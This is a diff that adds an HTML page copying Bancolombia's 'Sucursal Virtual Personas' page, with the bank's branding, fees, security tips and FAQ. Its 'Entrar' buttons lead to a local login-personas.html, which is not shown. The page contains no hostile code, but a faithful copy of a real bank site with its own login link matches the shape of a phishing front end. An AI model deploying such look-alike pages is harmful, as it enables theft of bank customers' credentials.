@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sucursal Virtual Personas</title>
+  <link rel="preconnect" href="https://library-sdb.apps.bancolombia.com" crossorigin />
+  <link rel="stylesheet" href="https://library-sdb.apps.bancolombia.com/assets/1.22.0/fonts/Open_Sans/Open_Sans.css" />
+  <link rel="stylesheet" href="https://library-sdb.apps.bancolombia.com/assets/1.22.0/fonts/CIBFont/CIBFont.css" />
+  <link rel="stylesheet" href="css/styles.css" />
+</head>
+<body>
+  <header class="site-header">
+    <div class="topbar">
+      <div class="container topbar-inner">
+        <nav class="topbar-left" aria-label="Segmentos">
+          <a href="personas.html" class="is-active">Personas</a>
+          <a href="index.html">Negocios</a>
+          <div class="menu">
+            <button class="menu-btn" data-menu="especializados">
+              Negocios especializados
+              <svg viewBox="0 0 12 8" aria-hidden="true"><path d="M1 1.5 6 6.5 11 1.5" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
+            </button>
+            <div class="dropdown" id="menu-especializados">
+              <a href="index.html">Agro</a>
+              <a href="index.html">Gobierno</a>
+              <a href="index.html">Constructor</a>
+              <a href="index.html">Institucional</a>
+            </div>
+          </div>
+          <a href="#">Tu360</a>
+          <a href="#">Blog</a>
+        </nav>
+        <nav class="topbar-right" aria-label="Información">
+          <a href="#">Transparencia</a>
+          <a href="#">Consumidor</a>
+        </nav>
+      </div>
+    </div>
+
+    <div class="navbar">
+      <div class="container navbar-inner">
+        <a class="brand" href="personas.html" aria-label="Ir a la página principal del sitio">
+          <img src="assets/bancolombia-horizontal.svg" alt="Bancolombia" />
+        </a>
+
+        <nav class="main-nav" aria-label="Principal">
+          <a href="personas.html">Inicio</a>
+          <div class="menu">
+            <button class="menu-btn ghost" data-menu="productos">Productos</button>
+            <div class="dropdown" id="menu-productos">
+              <a href="#">Cuentas</a>
+              <a href="#">Créditos</a>
+              <a href="#">Inversiones</a>
+              <a href="#">Tarjetas</a>
+            </div>
+          </div>
+          <div class="menu">
+            <button class="menu-btn ghost" data-menu="soluciones">Soluciones</button>
+            <div class="dropdown" id="menu-soluciones">
+              <a href="#">Mi Bancolombia</a>
+              <a href="#">Pagos</a>
+              <a href="#">Seguros</a>
+            </div>
+          </div>
+          <a href="#caracteristicas">Canales</a>
+        </nav>
+
+        <div class="navbar-actions">
+          <button class="btn btn-dark" type="button">Trámites digitales</button>
+          <div class="menu">
+            <button class="btn btn-outline" data-menu="sucursal" type="button">
+              Sucursal Virtual Personas
+              <svg viewBox="0 0 12 8" aria-hidden="true"><path d="M1 1.5 6 6.5 11 1.5" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
+            </button>
+            <div class="dropdown dropdown-right" id="menu-sucursal">
+              <a href="#caracteristicas">Características</a>
+              <a href="#soluciones">Qué puedes hacer</a>
+              <a href="#tarifas">Tarifas y topes</a>
+            </div>
+          </div>
+          <a class="btn btn-yellow" href="login-personas.html">Entrar</a>
+          <button class="icon-btn hamburger" type="button" aria-label="Abrir menú" data-open="mobile">
+            <span></span><span></span><span></span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <section class="hero">
+    <div class="container">
+      <nav class="breadcrumb" aria-label="Breadcrumb">
+        <a href="personas.html">Personas</a>
+        <span>›</span>
+        <a href="#">Canales</a>
+        <span>›</span>
+        <strong>Sucursal Virtual Personas</strong>
+      </nav>
+
+      <div class="hero-grid">
+        <div class="hero-copy">
+          <h1>App y Sucursal Virtual<br />Personas</h1>
+          <p>
+            Conoce el lugar para manejar tu plata a mayor detalle, con el mismo
+            usuario y contraseña que usas en tu app Mi Bancolombia.
+          </p>
+          <div class="hero-actions">
+            <button class="btn btn-outline-light" type="button" data-open="app">Descargar app</button>
+            <a class="btn btn-yellow" href="login-personas.html">Sucursal Virtual Personas</a>
+          </div>
+        </div>
+
+        <article class="video-card" data-open="video">
+          <img src="assets/hero-video.jpg" alt="Descubre todo lo que puedes hacer desde tu Sucursal Virtual Personas" />
+          <div class="video-overlay">
+            <div class="video-top">
+              <span class="mini-logo">
+                Bancolombia | Descubre todo lo que puedes hacer desde tu
+              </span>
+            </div>
+            <button class="play-btn" type="button" aria-label="Reproducir video">
+              <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+            </button>
+            <p class="video-caption">Maneja tu plata<br />con el mismo usuario<br />de tu app.</p>
+            <div class="video-bottom">
+              <span class="chip">⌂</span>
+              <span class="chip">◷</span>
+              <span class="yt-chip">Mirar en YouTube</span>
+            </div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="benefits" id="beneficios">
+    <div class="container">
+      <h2>¿Qué puedes hacer?</h2>
+      <div class="benefit-grid">
+        <button class="benefit-card dark" type="button">
+          <span class="benefit-icon">☺</span>
+          <span class="benefit-title">Consulta tus productos</span>
+          <span class="plus">+</span>
+          <p class="benefit-text">Revisa saldos y movimientos de tus cuentas, tarjetas y créditos.</p>
+        </button>
+        <button class="benefit-card yellow" type="button">
+          <span class="benefit-icon">✓</span>
+          <span class="benefit-title">Transfiere y paga</span>
+          <span class="plus">+</span>
+          <p class="benefit-text">Pasa plata a cuentas inscritas, otros bancos y fondos de inversión.</p>
+        </button>
+        <button class="benefit-card mint" type="button">
+          <span class="benefit-icon">🛡</span>
+          <span class="benefit-title">Abre productos</span>
+          <span class="plus">+</span>
+          <p class="benefit-text">Pide tarjetas, seguros, leasing y abre cuentas o inversiones virtuales.</p>
+        </button>
+        <button class="benefit-card pink" type="button">
+          <span class="benefit-icon">📄</span>
+          <span class="benefit-title">Paga facturas</span>
+          <span class="plus">+</span>
+          <p class="benefit-text">Inscribe y paga servicios públicos, impuestos y otras facturas.</p>
+        </button>
+        <button class="benefit-card lavender" type="button">
+          <span class="benefit-icon">🐷</span>
+          <span class="benefit-title">Descarga documentos</span>
+          <span class="plus">+</span>
+          <p class="benefit-text">Consulta certificados, extractos, reportes y proyecciones de créditos.</p>
+        </button>
+        <button class="benefit-card sky" type="button">
+          <span class="benefit-icon">👍</span>
+          <span class="benefit-title">Gestiona tu clave</span>
+          <span class="plus">+</span>
+          <p class="benefit-text">Crea o cambia tu clave del cajero e inscribe tu Clave Dinámica.</p>
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <section class="plans" id="caracteristicas">
+    <div class="container">
+      <h2>Características de tu Sucursal Virtual Personas</h2>
+      <div class="feature-grid">
+        <article class="feature-card">
+          <span class="feature-icon">💻</span>
+          <h3>Desde varios dispositivos</h3>
+          <p>Úsala desde tu computador, tableta o celular.</p>
+        </article>
+        <article class="feature-card">
+          <span class="feature-icon">☎</span>
+          <h3>Con contacto directo</h3>
+          <p>Agenda una llamada con un asesor o escríbenos por Tabot.</p>
+        </article>
+        <article class="feature-card">
+          <span class="feature-icon">Aa</span>
+          <h3>Con más accesibilidad</h3>
+          <p>Elige el tamaño de letra y el modo claro u oscuro.</p>
+        </article>
+        <article class="feature-card">
+          <span class="feature-icon">⏱</span>
+          <h3>Mayor control de datos</h3>
+          <p>Tu sesión se cierra después de siete minutos de inactividad.</p>
+        </article>
+        <article class="feature-card">
+          <span class="feature-icon">🔒</span>
+          <h3>Más protección</h3>
+          <p>Bloquea tu clave principal y personaliza los topes de tus transacciones.</p>
+        </article>
+        <article class="feature-card">
+          <span class="feature-icon">🔔</span>
+          <h3>Alertas gratuitas</h3>
+          <p>Recibe avisos de transferencias, retiros, compras y otros movimientos.</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="solutions" id="soluciones">
+    <div class="container">
+      <h2>Explora lo que puedes hacer en tus canales digitales</h2>
+      <div class="carousel" data-carousel>
+        <div class="carousel-track">
+          <article class="sol-card">
+            <div class="sol-media phone">
+              <div class="device">
+                <div class="device-screen">
+                  <strong>Mi Bancolombia</strong>
+                  <small>Entra con tu usuario</small>
+                </div>
+              </div>
+            </div>
+            <h3>Regístrate desde la app Mi Bancolombia</h3>
+            <a href="#">Seguir pasos ›</a>
+          </article>
+          <article class="sol-card">
+            <div class="sol-media desk">
+              <div class="monitor">
+                <span class="arc"></span>
+                <strong>Sucursal Virtual Personas</strong>
+              </div>
+            </div>
+            <h3>Inicia sesión con la seguridad de siempre</h3>
+            <a href="#">Seguir pasos ›</a>
+          </article>
+          <article class="sol-card">
+            <div class="sol-media desk alt">
+              <div class="monitor">
+                <span class="arc"></span>
+                <strong>Topes</strong>
+              </div>
+            </div>
+            <h3>Edita los topes de tus cuentas</h3>
+            <a href="#">Seguir pasos ›</a>
+          </article>
+          <article class="sol-card">
+            <div class="sol-media phone">
+              <div class="device">
+                <div class="device-screen">
+                  <strong>Clave Dinámica</strong>
+                  <small>Consúltala en la app</small>
+                </div>
+              </div>
+            </div>
+            <h3>Inscribe o bloquea tu Clave Dinámica</h3>
+            <a href="#">Seguir pasos ›</a>
+          </article>
+          <article class="sol-card">
+            <div class="sol-media desk">
+              <div class="monitor">
+                <span class="arc"></span>
+                <strong>Transferencias</strong>
+              </div>
+            </div>
+            <h3>Transfiere a cuentas inscritas u otros bancos</h3>
+            <a href="#">Seguir pasos ›</a>
+          </article>
+          <article class="sol-card">
+            <div class="sol-media phone">
+              <div class="device">
+                <div class="device-screen">
+                  <strong>Facturas</strong>
+                  <small>Inscribe y paga</small>
+                </div>
+              </div>
+            </div>
+            <h3>Paga facturas y servicios</h3>
+            <a href="#">Seguir pasos ›</a>
+          </article>
+        </div>
+        <div class="carousel-nav">
+          <button class="nav-circle" type="button" data-prev aria-label="Anterior">‹</button>
+          <div class="dots" data-dots></div>
+          <button class="nav-circle" type="button" data-next aria-label="Siguiente">›</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="docs" id="tarifas">
+    <div class="container">
+      <h2>Tarifas y topes</h2>
+      <p class="muted" style="margin-bottom: 22px;">Estos son los valores iniciales, antes de personalizar tus topes.</p>
+      <div class="rates">
+        <article class="rate-card">
+          <span>Pago de créditos y tarjetas</span>
+          <strong>$30.000.000</strong>
+          <span>por día · Sin límite de transacciones</span>
+        </article>
+        <article class="rate-card">
+          <span>Pago de facturas</span>
+          <strong>$30.000.000</strong>
+          <span>por día · 20 transacciones al mes</span>
+        </article>
+        <article class="rate-card">
+          <span>Transferencias a cuentas</span>
+          <strong>$30.000.000</strong>
+          <span>por día · Sin límite de transacciones</span>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="docs" id="seguridad">
+    <div class="container">
+      <h2>Ten en cuenta estos consejos de seguridad</h2>
+      <ul class="tips">
+        <li>Ingresa siempre desde bancolombia.com y verifica el candado cerrado en el navegador.</li>
+        <li>Confirma que la última fecha de conexión coincida con la última vez que entraste.</li>
+        <li>Cierra sesión cuando termines y evita redes públicas.</li>
+        <li>Mantén tu computador, tableta o celular actualizados y con antivirus.</li>
+      </ul>
+      <aside class="notice light">
+        <span class="notice-icon">💡</span>
+        <p>
+          Nos comprometemos a entregarte los estándares de seguridad y calidad que aplican en la regulación
+          vigente. Por su naturaleza, nuestros canales pueden estar sujetos a fallas, errores, interrupciones
+          o intermitencias que pueden afectar el servicio.
+        </p>
+      </aside>
+    </div>
+  </section>
+
+  <section class="faq-cta">
+    <button type="button" data-open="faq">
+      <span class="faq-bubble">?</span>
+      Preguntas frecuentes
+    </button>
+  </section>
+
+  <footer class="site-footer">
+    <div class="container footer-grid">
+      <div>
+        <a class="brand light" href="personas.html" aria-label="Bancolombia">
+          <img src="assets/bancolombia-horizontal-white.svg" alt="Bancolombia" />
+        </a>
+        <p class="legal">
+          Productos y servicios ofrecidos por Bancolombia S.A., Fiduciaria Bancolombia S.A.,
+          Valores Bancolombia S.A. y Banca de Inversión Bancolombia S.A.
+        </p>
+      </div>
+      <div>
+        <h3>Te puede interesar</h3>
+        <a href="#">Centro de Ayuda</a>
+        <a href="#">Canales</a>
+        <a href="#">Estado de canales</a>
+        <a href="#">Puntos de atención</a>
+      </div>
+      <div>
+        <h3>Contáctanos</h3>
+        <p>Bogotá: +57 (601) 343 0000</p>
+        <p>Medellín: +57 (604) 510 9000</p>
+        <p>Línea gratuita: 01 8000 9 12345</p>
+      </div>
+    </div>
+  </footer>
+
+  <button class="help-fab" type="button" data-open="help">
+    <span>💬</span> Te ayudamos
+    <span class="caret">⌃</span>
+  </button>
+
+  <div class="overlay" id="overlay" hidden></div>
+
+  <div class="modal" id="modal-app" hidden>
+    <div class="modal-card narrow">
+      <button class="close" type="button" data-close>×</button>
+      <h2>Escanea el código</h2>
+      <p>Descarga la app Mi Bancolombia en tu celular.</p>
+      <div class="qr" aria-hidden="true"></div>
+      <p class="muted">Disponible en App Store y Google Play.</p>
+    </div>
+  </div>
+
+  <div class="modal" id="modal-video" hidden>
+    <div class="modal-card video-modal">
+      <button class="close" type="button" data-close>×</button>
+      <img src="assets/hero-video.jpg" alt="" />
+      <p>Descubre todo lo que la Sucursal Virtual Personas tiene para ti.</p>
+    </div>
+  </div>
+
+  <div class="modal" id="modal-faq" hidden>
+    <div class="modal-card">
+      <button class="close" type="button" data-close>×</button>
+      <h2>Preguntas frecuentes</h2>
+      <details open>
+        <summary>¿Cómo ingreso a la Sucursal Virtual Personas?</summary>
+        <p>Entra desde bancolombia.com, elige Sucursal Virtual Personas y usa el mismo usuario y clave de tu app Mi Bancolombia.</p>
+      </details>
+      <details>
+        <summary>¿Qué necesito para entrar?</summary>
+        <p>Ser persona natural, cliente con cuenta depósito y tener usuario y clave principal activa.</p>
+      </details>
+      <details>
+        <summary>¿Puedo usar el mismo usuario de la app?</summary>
+        <p>Sí. La Sucursal Virtual Personas comparte usuario y clave con Mi Bancolombia.</p>
+      </details>
+    </div>
+  </div>
+
+  <aside class="help-panel" id="panel-help" hidden>
+    <header>
+      <strong>Hola, selecciona un canal</strong>
+      <button type="button" data-close aria-label="Cerrar">×</button>
+    </header>
+    <button type="button">
+      <span>
+        <strong>Chatea con nosotros</strong>
+        <small>Comunícate con equipo experto.</small>
+      </span>
+      ›
+    </button>
+    <button type="button">
+      <span>
+        <strong>Te llamamos</strong>
+        <small>Tú eliges el día y la hora</small>
+      </span>
+      ›
+    </button>
+  </aside>
+
+  <div class="drawer" id="drawer-mobile" hidden>
+    <button class="close" type="button" data-close>×</button>
+    <a href="personas.html">Inicio</a>
+    <a href="#beneficios">Qué puedes hacer</a>
+    <a href="#caracteristicas">Características</a>
+    <a href="#tarifas">Tarifas y topes</a>
+    <a class="btn btn-yellow" href="login-personas.html">Entrar</a>
+  </div>
+
+  <script src="js/main.js"></script>
+</body>
+</html>
